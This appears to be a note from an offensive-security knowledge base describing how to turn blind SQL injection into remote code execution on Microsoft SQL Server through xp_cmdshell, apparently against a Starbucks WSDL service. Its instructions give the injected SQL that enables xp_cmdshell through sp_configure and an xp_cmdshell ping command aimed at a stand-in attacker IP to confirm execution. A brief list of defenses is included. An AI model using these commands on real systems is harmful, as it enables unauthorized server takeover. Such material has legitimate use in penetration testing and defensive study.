---
id: proc-rce-xp_cmdshell
tags:
  - rce
  - xp_cmdshell
  - mssql
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xp_cmdshell-ping-demo]]'
verified: false
platforms:
  - Windows
  - Microsoft SQL Server
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T03:15:10.088Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Execute RCE via xp_cmdshell

## Summary

This procedure escalates blind SQL injection to remote code execution by invoking the xp_cmdshell extended procedure on Microsoft SQL Server, allowing arbitrary command execution on the host.

## Description

After gaining database access via SQLi in the Starbucks WSDL service, the attacker uses stacked queries or UNION to call xp_cmdshell, targeting a production server. A safe ping command demonstrates capability without harm.

## Requirements

1. Blind SQLi access to execute multi-statement queries
2. xp_cmdshell enabled (or enable via sp_configure)
3. Attacker's IP for ping verification

## Defense

Defensive measures and detection strategies:

- Disable xp_cmdshell and other extended procs
- Use least privilege for database accounts
- Monitor SQL logs for suspicious procedure calls and network anomalies

## Objectives

1. Invoke system commands via SQL
2. Confirm RCE with observable action (e.g., ping)
3. Escalate from DB access to server control

## Instructions

### Step 1: Enable xp_cmdshell if Needed

**Context**: Use SQLi to run sp_configure to enable the proc.

**Command** (Injected SQL via SOAP):
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

> Inject via blind method; expected: No error response.

### Step 2: Execute Ping Command

**Context**: Call xp_cmdshell with ping to demo RCE.

**Command** ([[commands/xp_cmdshell-ping-demo]]):
```sql
EXEC xp_cmdshell 'ping -n 1 attacker-ip';
```

> Expected: Ping packet received at attacker's machine from server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/xp_cmdshell-ping-demo]]

## Tools Used


## Tags

- [[rce]]
- [[xp_cmdshell]]
- [[mssql]]
